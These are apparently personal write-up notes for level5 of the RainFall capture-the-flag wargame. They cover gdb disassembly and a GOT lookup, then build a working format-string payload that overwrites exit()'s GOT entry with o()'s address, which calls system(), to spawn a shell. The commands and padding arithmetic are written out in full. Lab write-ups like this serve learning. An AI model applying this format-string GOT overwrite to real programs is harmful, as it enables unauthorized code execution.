```
    (gdb) info functions 
        All defined functions:

        Non-debugging symbols:
        0x08048334  _init
        0x08048380  printf
        0x08048380  printf@plt
        0x08048390  _exit
        0x08048390  _exit@plt
        0x080483a0  fgets
        0x080483a0  fgets@plt
        0x080483b0  system
        0x080483b0  system@plt
        0x080483c0  __gmon_start__
        0x080483c0  __gmon_start__@plt
        0x080483d0  exit
        0x080483d0  exit@plt
        0x080483e0  __libc_start_main
        0x080483e0  __libc_start_main@plt
        0x080483f0  _start
        0x08048420  __do_global_dtors_aux
        0x08048480  frame_dummy
        0x080484a4  o
        0x080484c2  n
        0x08048504  main
        0x08048520  __libc_csu_init
        0x08048590  __libc_csu_fini
        0x08048592  __i686.get_pc_thunk.bx
        0x080485a0  __do_global_ctors_aux
        0x080485cc  _fini
    (gdb) disas o
        Dump of assembler code for function o:
        0x080484a4 <+0>:     push   %ebp
        0x080484a5 <+1>:     mov    %esp,%ebp
        0x080484a7 <+3>:     sub    $0x18,%esp
        0x080484aa <+6>:     movl   $0x80485f0,(%esp)
        0x080484b1 <+13>:    call   0x80483b0 <system@plt>
        0x080484b6 <+18>:    movl   $0x1,(%esp)
        0x080484bd <+25>:    call   0x8048390 <_exit@plt>
        End of assembler dump.
```

the address of o() is => 0x080484a4


```
    for geting arguments: ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
```


```
    level5@RainFall:~$ objdump -R ./level5 | grep exit
    08049828 R_386_JUMP_SLOT   _exit
    08049838 R_386_JUMP_SLOT   exit
```

address of exit() is => 0x08049838 => 
litle indian1 => \x38\x98\x04\x08
litle indian2 => \x3a\x98\x04\x08

```
    the address of o() is => 0x080484a4

    Decimal number of 0x0804 => 2052
    Decimal number of 0x84a4 => 33956

    first_padding = 2052 - 8 = 2044
    second_padding = 33956 - 2052 = 31904
```

python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")' > /tmp/hax
(cat /tmp/hax; cat) | ./level5



9a3ida:
```
    0x0804a004

    upper = 0x0804 => 2052
    lower = 0xa004 => 40964

    uper - dakchiliprintiti9bl = 2052 - 8 = 2044

    lower - upper = 40964 - 2052 = 38912
```

